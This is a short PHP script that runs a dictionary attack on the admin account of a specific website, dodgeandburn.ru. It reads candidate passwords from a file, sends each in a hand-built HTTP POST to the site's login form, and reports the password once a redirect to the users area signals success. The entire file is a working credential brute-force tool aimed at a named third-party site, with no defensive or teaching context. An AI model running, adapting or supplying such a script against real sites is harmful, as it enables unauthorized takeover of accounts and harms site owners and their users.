<?php
$file = fopen("pass.txt", "r");
$bool = true;
$n = 0;
while($bool && $pass = fgets($file)){
    $f = fopen("log.txt", "w");
    fwrite($f,$n);
    $pass = trim($pass);
    echo $n.") PASSWORD: ".$pass;
    if(strlen($pass) >= 6){
        $data = "login=admin&pass=".$pass."&remember=1&login_btn=Войти";
        $socket = fsockopen("dodgeandburn.ru", 80);
        $out = "POST /login HTTP/1.1\r\n";
        $out .= "Host: dodgeandburn.ru\r\n";
        $out .= "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0\r\n";
        $out .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $out .= "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n";
        $out .= "Referer: http://dodgeandburn.ru/registration\r\n";
        $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $out .= "Connection: keep-alive\r\n";
        $out .= "Content-Length: ".  strlen($data)."\r\n\r\n";
        $out .= $data;
        $s = "";
        fwrite($socket, $out);
        while (!feof($socket)) {
                $s .= fgets($socket);
            }
        fclose($socket);
        preg_match("/HTTP\/1.1 303/sU", $s,$match);
        echo " | ".$match[0];
        if(preg_match("/Location: \/users/sU", $s)){
            echo " | WE FIND! PASSWORD: ".$pass."\n";
            echo $s;
            $bool = false;
        }else{
            echo " | BAD.\n";
        }
    }
    else{
        echo " | small length >> next\n";
    }
    fclose($f);
    $n++;
}
fclose($file);

?>
